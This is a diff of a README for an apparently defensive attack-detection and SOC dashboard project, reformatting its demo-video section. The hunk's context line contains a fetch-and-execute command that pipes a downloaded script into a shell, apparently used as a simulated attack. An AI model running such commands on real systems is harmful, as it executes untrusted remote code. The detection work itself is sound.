@@ -137,20 +137,17 @@ bash -c "curl [http://example.com](http://example.com) | sh"
 
 ---
 
-## 🎥 Demo Video
+## 🎥 Demo Video (YouTube)
 
-📺 Project Demo:
-👉 (Add your YouTube video link here)
+📺 **Project Demo:**  
+👉 https://www.youtube.com/watch?v=YOUR_VIDEO_LINK_HERE
 
-The demo explains:
+### 📌 Demo Covers:
+- Overall system architecture
+- Live attack simulation (process, file & network)
+- Real-time SOC dashboard alerts
+- Detection logic & hardening approach
 
-Architecture
-
-Live attack simulation
-
-Dashboard alerts
-
-Detection logic
 
 ---
 
